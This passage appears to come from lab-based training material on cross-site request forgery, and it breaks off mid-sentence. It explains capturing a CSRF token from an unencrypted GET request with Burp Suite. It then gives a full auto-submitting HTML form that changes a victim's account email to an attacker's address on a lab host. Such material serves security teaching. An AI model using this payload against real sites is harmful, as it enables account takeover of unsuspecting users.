## GET-based
Similar to how we can extract session cookies from applications that do not utilize SSL encryption, we can do the same regarding CSRF tokens included in unencrypted requests.

To retrieve CSRF tokens in an HTTP GET request, use a proxy tool such as Burp Suite to intercept the request. Notice that the CSRF token is included in the request as a query parameter.

With the CSRF token now in attacker's hand, all they have to do is create and serve the below HTML page to deface or takeover someone else's account:
```html
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

An attacker will then serve this malicious web page on a server and wait for the unsuspecting user to access the malicious URL to perform unintended actions.
## POST-based
The vast majority of applications nowadays perform actions through POST requests. Subsequently, CSRF tokens will reside in POST data. In the following example, we will attack an application and find a way to leak the CSRF token to allow us to mount a CSRF attack.

Using Burp Suite, intercept the POST request `/app/delete/our-email@htb.net`, notice that 